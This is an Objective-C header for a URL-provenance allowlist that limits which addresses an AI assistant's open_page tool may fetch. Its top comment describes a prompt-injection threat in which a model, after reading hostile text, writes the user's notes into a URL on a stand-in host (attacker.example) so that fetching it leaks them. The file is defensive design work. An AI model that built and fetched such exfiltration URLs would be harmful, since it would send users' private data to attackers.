#pragma once
// Which addresses open_page may open during one request. A model that has read hostile text (a document, a page, a
// friend's message) could write what it knows into an address it composes, https://attacker.example/?q=<the user's
// notes>, and fetching that address would deliver it. So open_page opens only addresses from sources the model cannot
// write: what the person typed, the URLs of web_search results as the search engine cited them, and the links of a
// page already opened, as the site's HTML has them. Tool output in general does not count, because the model writes
// or steers much of it: a refusal that echoes an argument, web_search's echo of its query, what run_python printed, a
// subagent's summary. The site's own redirects are still followed. Main thread only.
#import <Foundation/Foundation.h>

NS_ASSUME_NONNULL_BEGIN

@interface SPDFMacAIWebProvenance : NSObject
- (void)reset;
// What the person typed: addresses as people write them count too ("example.com/pricing").
- (void)notePersonText:(NSString*)text;
// One address from a source the model cannot write: a search result's cited URL, an opened page or one of its links.
- (void)noteURL:(NSURL*)URL;
- (BOOL)allowsURL:(NSURL*)URL;
@property(nonatomic, readonly) NSUInteger count;
@end

// How two addresses are compared: http and https alike, host case and a trailing dot ignored, default ports and the
// fragment dropped, a trailing slash ignored; path and query exact. nil for a URL with no host.
NSString* _Nullable SPDFMacAIWebProvenanceKey(NSURL* URL);

NS_ASSUME_NONNULL_END
